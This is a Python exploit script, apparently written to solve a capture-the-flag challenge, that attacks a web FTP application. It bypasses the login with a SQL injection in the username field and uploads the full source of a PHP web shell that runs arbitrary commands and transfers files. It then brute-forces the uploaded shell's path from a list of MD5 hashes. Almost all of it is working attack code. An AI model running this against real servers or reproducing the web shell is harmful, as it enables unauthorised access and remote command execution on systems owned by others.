#!/usr/bin/python2.7
#coding:utf-8

from sys import *
import requests
import re
# import hackhttp

host = argv[1]
port = int(argv[2])
timeout = 30


def getshell():
    #登录
    url_base = "http://"+host+":"+str(port)
    url = url_base + "/login.php?act=login_check"
    cookies = {"webftp_ssid": "rvfr4ejpnh5iqoh8c4joqbs336"}
    headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"94\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://127.0.0.1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://127.0.0.1/ctf/login.php?act=in", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}
    data = {"forward": '', "wf_uname": "123\" union select \"21232f297a57a5a743894a0e4a801fc3\"#", "wf_upawd": "admin", "wf_uhash": "4879"}
    res = requests.post(url, headers=headers, cookies=cookies, data=data)

    #上传webshell
    url = url_base + "/webftp.php?mod=nfs&act=upload&key=asljasasfgjsag&fs-path=/&fs-cover=0"
    data = "------WebKitFormBoundaryWqOuZahdbyPifJBB\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nshell.php\r\n------WebKitFormBoundaryWqOuZahdbyPifJBB\r\nContent-Disposition: form-data; name=\"webftp_sessid\"\r\n\r\nundefined\r\n------WebKitFormBoundaryWqOuZahdbyPifJBB\r\nContent-Disposition: form-data; name=\"webftp_uname\"\r\n\r\nundefined\r\n------WebKitFormBoundaryWqOuZahdbyPifJBB\r\nContent-Disposition: form-data; name=\"webftp_tokey\"\r\n\r\nundefined\r\n------WebKitFormBoundaryWqOuZahdbyPifJBB\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\r\n\r\nfunction featureShell($cmd, $cwd) {\r\n    $stdout = array();\r\n\r\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\r\n        // pass\r\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\r\n        chdir($cwd);\r\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\r\n        chdir($match[1]);\r\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\r\n        chdir($cwd);\r\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\r\n        return featureDownload($match[1]);\r\n    } else {\r\n        chdir($cwd);\r\n        exec($cmd, $stdout);\r\n    }\r\n\r\n    return array(\r\n        \"stdout\" => $stdout,\r\n        \"cwd\" => getcwd()\r\n    );\r\n}\r\n\r\nfunction featurePwd() {\r\n    return array(\"cwd\" => getcwd());\r\n}\r\n\r\nfunction featureHint($fileName, $cwd, $type) {\r\n    chdir($cwd);\r\n    if ($type == 'cmd') {\r\n        $cmd = \"compgen -c $fileName\";\r\n    } else {\r\n        $cmd = \"compgen -f $fileName\";\r\n    }\r\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\r\n    $files = explode(\"\\n\", shell_exec($cmd));\r\n    return array(\r\n        'files' => $files,\r\n    );\r\n}\r\n\r\nfunction featureDownload($filePath) {\r\n    $file = @file_get_contents($filePath);\r\n    if ($file === FALSE) {\r\n        return array(\r\n            'stdout' => array('File not found / no read permission.'),\r\n            'cwd' => getcwd()\r\n        );\r\n    } else {\r\n        return array(\r\n            'name' => basename($filePath),\r\n            'file' => base64_encode($file)\r\n        );\r\n    }\r\n}\r\n\r\nfunction featureUpload($path, $file, $cwd) {\r\n    chdir($cwd);\r\n    $f = @fopen($path, 'wb');\r\n    if ($f === FALSE) {\r\n        return array(\r\n            'stdout' => array('Invalid path / no write permission.'),\r\n            'cwd' => getcwd()\r\n        );\r\n    } else {\r\n        fwrite($f, base64_decode($file));\r\n        fclose($f);\r\n        return array(\r\n            'stdout' => array('Done.'),\r\n            'cwd' => getcwd()\r\n        );\r\n    }\r\n}\r\n\r\nif (isset($_GET[\"feature\"])) {\r\n\r\n    $response = NULL;\r\n\r\n    switch ($_GET[\"feature\"]) {\r\n        case \"shell\":\r\n            $cmd = $_POST['cmd'];\r\n            if (!preg_match('/2>/', $cmd)) {\r\n                $cmd .= ' 2>&1';\r\n            }\r\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\r\n            break;\r\n        case \"pwd\":\r\n            $response = featurePwd();\r\n            break;\r\n        case \"hint\":\r\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\r\n            break;\r\n        case 'upload':\r\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\r\n    }\r\n\r\n    header(\"Content-Type: application/json\");\r\n    echo json_encode($response);\r\n    die();\r\n}\r\n\r\n?><!DOCTYPE html>\r\n\r\n<html>\r\n\r\n    <head>\r\n        <meta charset=\"UTF-8\" />\r\n        <title>p0wny@shell:~#</title>\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n        <style>\r\n            html, body {\r\n                margin: 0;\r\n                padding: 0;\r\n                background: #333;\r\n                color: #eee;\r\n                font-family: monospace;\r\n            }\r\n\r\n            *::-webkit-scrollbar-track {\r\n                border-radius: 8px;\r\n                background-color: #353535;\r\n            }\r\n\r\n            *::-webkit-scrollbar {\r\n                width: 8px;\r\n                height: 8px;\r\n            }\r\n\r\n            *::-webkit-scrollbar-thumb {\r\n                border-radius: 8px;\r\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\r\n                background-color: #bcbcbc;\r\n            }\r\n\r\n            #shell {\r\n                background: #222;\r\n                max-width: 800px;\r\n                margin: 50px auto 0 auto;\r\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\r\n                font-size: 10pt;\r\n                display: flex;\r\n                flex-direction: column;\r\n                align-items: stretch;\r\n            }\r\n\r\n            #shell-content {\r\n                height: 500px;\r\n                overflow: auto;\r\n                padding: 5px;\r\n                white-space: pre-wrap;\r\n                flex-grow: 1;\r\n            }\r\n\r\n            #shell-logo {\r\n                font-weight: bold;\r\n                color: #FF4180;\r\n                text-align: center;\r\n            }\r\n\r\n            @media (max-width: 991px) {\r\n                #shell-logo {\r\n                    font-size: 6px;\r\n                    margin: -25px 0;\r\n                }\r\n\r\n                html, body, #shell {\r\n                    height: 100%;\r\n                    width: 100%;\r\n                    max-width: none;\r\n                }\r\n\r\n                #shell {\r\n                    margin-top: 0;\r\n                }\r\n            }\r\n\r\n            @media (max-width: 767px) {\r\n                #shell-input {\r\n                    flex-direction: column;\r\n                }\r\n            }\r\n\r\n            @media (max-width: 320px) {\r\n                #shell-logo {\r\n                    font-size: 5px;\r\n                }\r\n            }\r\n\r\n            .shell-prompt {\r\n                font-weight: bold;\r\n                color: #75DF0B;\r\n            }\r\n\r\n            .shell-prompt > span {\r\n                color: #1BC9E7;\r\n            }\r\n\r\n            #shell-input {\r\n                display: flex;\r\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\r\n                border-top: rgba(255, 255, 255, .05) solid 1px;\r\n            }\r\n\r\n            #shell-input > label {\r\n                flex-grow: 0;\r\n                display: block;\r\n                padding: 0 5px;\r\n                height: 30px;\r\n                line-height: 30px;\r\n            }\r\n\r\n            #shell-input #shell-cmd {\r\n                height: 30px;\r\n                line-height: 30px;\r\n                border: none;\r\n                background: transparent;\r\n                color: #eee;\r\n                font-family: monospace;\r\n                font-size: 10pt;\r\n                width: 100%;\r\n                align-self: center;\r\n            }\r\n\r\n            #shell-input div {\r\n                flex-grow: 1;\r\n                align-items: stretch;\r\n            }\r\n\r\n            #shell-input input {\r\n                outline: none;\r\n            }\r\n        </style>\r\n\r\n        <script>\r\n            var CWD = null;\r\n            var commandHistory = [];\r\n            var historyPosition = 0;\r\n            var eShellCmdInput = null;\r\n            var eShellContent = null;\r\n\r\n            function _insertCommand(command) {\r\n                eShellContent.innerHTML += \"\\n\\n\";\r\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\r\n                eShellContent.innerHTML += escapeHtml(command);\r\n                eShellContent.innerHTML += \"\\n\";\r\n                eShellContent.scrollTop = eShellContent.scrollHeight;\r\n            }\r\n\r\n            function _insertStdout(stdout) {\r\n                eShellContent.innerHTML += escapeHtml(stdout);\r\n                eShellContent.scrollTop = eShellContent.scrollHeight;\r\n            }\r\n\r\n            function _defer(callback) {\r\n                setTimeout(callback, 0);\r\n            }\r\n\r\n            function featureShell(command) {\r\n\r\n                _insertCommand(command);\r\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\r\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\r\n                } else if (/^\\s*clear\\s*$/.test(command)) {\r\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\r\n                    eShellContent.innerHTML = '';\r\n                } else {\r\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\r\n                        if (response.hasOwnProperty('file')) {\r\n                            featureDownload(response.name, response.file)\r\n                        } else {\r\n                            _insertStdout(response.stdout.join(\"\\n\"));\r\n                            updateCwd(response.cwd);\r\n                        }\r\n                    });\r\n                }\r\n            }\r\n\r\n            function featureHint() {\r\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\r\n\r\n                function _requestCallback(data) {\r\n                    if (data.files.length <= 1) return;  // no completion\r\n\r\n                    if (data.files.length === 2) {\r\n                        if (type === 'cmd') {\r\n                            eShellCmdInput.value = data.files[0];\r\n                        } else {\r\n                            var currentValue = eShellCmdInput.value;\r\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\r\n                        }\r\n                    } else {\r\n                        _insertCommand(eShellCmdInput.value);\r\n                        _insertStdout(data.files.join(\"\\n\"));\r\n                    }\r\n                }\r\n\r\n                var currentCmd = eShellCmdInput.value.split(\" \");\r\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\r\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\r\n\r\n                makeRequest(\r\n                    \"?feature=hint\",\r\n                    {\r\n                        filename: fileName,\r\n                        cwd: CWD,\r\n                        type: type\r\n                    },\r\n                    _requestCallback\r\n                );\r\n\r\n            }\r\n\r\n            function featureDownload(name, file) {\r\n                var element = document.createElement('a');\r\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\r\n                element.setAttribute('download', name);\r\n                element.style.display = 'none';\r\n                document.body.appendChild(element);\r\n                element.click();\r\n                document.body.removeChild(element);\r\n                _insertStdout('Done.');\r\n            }\r\n\r\n            function featureUpload(path) {\r\n                var element = document.createElement('input');\r\n                element.setAttribute('type', 'file');\r\n                element.style.display = 'none';\r\n                document.body.appendChild(element);\r\n                element.addEventListener('change', function () {\r\n                    var promise = getBase64(element.files[0]);\r\n                    promise.then(function (file) {\r\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\r\n                            _insertStdout(response.stdout.join(\"\\n\"));\r\n                            updateCwd(response.cwd);\r\n                        });\r\n                    }, function () {\r\n                        _insertStdout('An unknown client-side error occurred.');\r\n                    });\r\n                });\r\n                element.click();\r\n                document.body.removeChild(element);\r\n            }\r\n\r\n            function getBase64(file, onLoadCallback) {\r\n                return new Promise(function(resolve, reject) {\r\n                    var reader = new FileReader();\r\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\r\n                    reader.onerror = reject;\r\n                    reader.readAsDataURL(file);\r\n                });\r\n            }\r\n\r\n            function genPrompt(cwd) {\r\n                cwd = cwd || \"~\";\r\n                var shortCwd = cwd;\r\n                if (cwd.split(\"/\").length > 3) {\r\n                    var splittedCwd = cwd.split(\"/\");\r\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\r\n                }\r\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\r\n            }\r\n\r\n            function updateCwd(cwd) {\r\n                if (cwd) {\r\n                    CWD = cwd;\r\n                    _updatePrompt();\r\n                    return;\r\n                }\r\n                makeRequest(\"?feature=pwd\", {}, function(response) {\r\n                    CWD = response.cwd;\r\n                    _updatePrompt();\r\n                });\r\n\r\n            }\r\n\r\n            function escapeHtml(string) {\r\n                return string\r\n                    .replace(/&/g, \"&amp;\")\r\n                    .replace(/</g, \"&lt;\")\r\n                    .replace(/>/g, \"&gt;\");\r\n            }\r\n\r\n            function _updatePrompt() {\r\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\r\n                eShellPrompt.innerHTML = genPrompt(CWD);\r\n            }\r\n\r\n            function _onShellCmdKeyDown(event) {\r\n                switch (event.key) {\r\n                    case \"Enter\":\r\n                        featureShell(eShellCmdInput.value);\r\n                        insertToHistory(eShellCmdInput.value);\r\n                        eShellCmdInput.value = \"\";\r\n                        break;\r\n                    case \"ArrowUp\":\r\n                        if (historyPosition > 0) {\r\n                            historyPosition--;\r\n                            eShellCmdInput.blur();\r\n                            eShellCmdInput.value = commandHistory[historyPosition];\r\n                            _defer(function() {\r\n                                eShellCmdInput.focus();\r\n                            });\r\n                        }\r\n                        break;\r\n                    case \"ArrowDown\":\r\n                        if (historyPosition >= commandHistory.length) {\r\n                            break;\r\n                        }\r\n                        historyPosition++;\r\n                        if (historyPosition === commandHistory.length) {\r\n                            eShellCmdInput.value = \"\";\r\n                        } else {\r\n                            eShellCmdInput.blur();\r\n                            eShellCmdInput.focus();\r\n                            eShellCmdInput.value = commandHistory[historyPosition];\r\n                        }\r\n                        break;\r\n                    case 'Tab':\r\n                        event.preventDefault();\r\n                        featureHint();\r\n                        break;\r\n                }\r\n            }\r\n\r\n            function insertToHistory(cmd) {\r\n                commandHistory.push(cmd);\r\n                historyPosition = commandHistory.length;\r\n            }\r\n\r\n            function makeRequest(url, params, callback) {\r\n                function getQueryString() {\r\n                    var a = [];\r\n                    for (var key in params) {\r\n                        if (params.hasOwnProperty(key)) {\r\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\r\n                        }\r\n                    }\r\n                    return a.join(\"&\");\r\n                }\r\n                var xhr = new XMLHttpRequest();\r\n                xhr.open(\"POST\", url, true);\r\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\r\n                xhr.onreadystatechange = function() {\r\n                    if (xhr.readyState === 4 && xhr.status === 200) {\r\n                        try {\r\n                            var responseJson = JSON.parse(xhr.responseText);\r\n                            callback(responseJson);\r\n                        } catch (error) {\r\n                            alert(\"Error while parsing response: \" + error);\r\n                        }\r\n                    }\r\n                };\r\n                xhr.send(getQueryString());\r\n            }\r\n\r\n            document.onclick = function(event) {\r\n                event = event || window.event;\r\n                var selection = window.getSelection();\r\n                var target = event.target || event.srcElement;\r\n\r\n                if (target.tagName === \"SELECT\") {\r\n                    return;\r\n                }\r\n\r\n                if (!selection.toString()) {\r\n                    eShellCmdInput.focus();\r\n                }\r\n            };\r\n\r\n            window.onload = function() {\r\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\r\n                eShellContent = document.getElementById(\"shell-content\");\r\n                updateCwd();\r\n                eShellCmdInput.focus();\r\n            };\r\n        </script>\r\n    </head>\r\n\r\n    <body>\r\n        <div id=\"shell\">\r\n            <pre id=\"shell-content\">\r\n                <div id=\"shell-logo\">\r\n        ___                         ____      _          _ _        _  _   <span></span>\r\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\r\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\r\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\r\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\r\n|_|                         |___/  \\____/                                  <span></span>\r\n                </div>\r\n            </pre>\r\n            <div id=\"shell-input\">\r\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\r\n                <div>\r\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </body>\r\n\r\n</html>\r\n------WebKitFormBoundaryWqOuZahdbyPifJBB--\r\n"
    requests.post(url, headers=headers, cookies=cookies, data=data)

    #爆破webshell地址
    url = url_base + "/data/user/"
    md5s = [i for i in open("1-1000md5.txt").readlines()]
    for j in md5s:
        res = requests.get(url + j + "shell.php", headers=headers, cookies=cookies)
        if res.status_code == 200:
            return url + j + "shell.php"

if __name__ == '__main__':
    print(getshell())
